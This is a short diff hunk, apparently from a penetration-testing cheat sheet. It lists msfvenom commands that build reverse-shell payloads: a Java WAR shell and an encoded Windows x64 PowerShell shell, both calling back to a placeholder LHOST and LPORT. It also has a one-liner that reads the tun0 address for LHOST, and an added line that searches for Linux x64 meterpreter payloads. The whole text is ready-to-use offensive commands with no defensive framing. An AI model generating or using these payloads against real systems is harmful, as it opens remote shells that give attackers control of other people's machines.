@@ -7,3 +7,6 @@ msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.w
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -a x64 --platform windows -b '\x00' -e x64\xor_dynamic -o shell.exe
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+
+# search payloads
+msfvenom --list payloads | grep linux | grep meterpreter | grep x64
